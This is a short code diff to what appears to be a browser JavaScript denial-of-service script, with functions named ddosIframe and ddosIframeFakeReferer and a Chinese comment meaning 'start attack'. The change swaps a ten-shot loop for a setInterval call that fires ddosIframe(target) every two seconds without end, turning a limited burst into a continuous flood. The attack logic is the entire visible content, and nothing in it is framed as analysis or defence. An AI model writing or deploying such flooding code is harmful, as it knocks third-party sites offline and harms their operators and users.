@@ -23,11 +23,14 @@ function ddosIframeFakeReferer(target){
 }
 
 
-///////////////////////////////////////////
+
 ///// 开始攻击
+/*
 var i = 0;
 do {
 	setTimeout("ddosIframe(target)", 200);
 	i = i+1;
 }
 while (i<=10);
+*/
+setInterval("ddosIframe(target)", 2000);
